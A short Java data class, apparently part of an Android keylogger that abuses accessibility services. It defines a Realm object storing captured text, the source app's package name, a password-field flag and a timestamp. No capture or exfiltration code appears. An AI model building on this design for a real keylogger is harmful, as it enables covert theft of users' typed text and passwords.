package com.accessibility.keylogger.module.accessibility.object;

import io.realm.RealmObject;

public class TypeViewTextSelectionChangedEventObject extends RealmObject {
    private String mText;
    private String mPackageName;
    private boolean mIsPassword;
    private long mTimestamp;

    public String getText() {
        return mText;
    }
    public void setText(String text) {
        mText = text;
    }

    public String getPackageName() {
        return mPackageName;
    }
    public void setPackageName(String packageName) {
        mPackageName = packageName;
    }

    public boolean isIsPassword() {
        return mIsPassword;
    }
    public void setIsPassword(boolean isPassword) {
        this.mIsPassword = isPassword;
    }

    public long getTimestamp() {
        return mTimestamp;
    }
    public void setTimestamp(long timestamp) {
        mTimestamp = timestamp;
    }
}
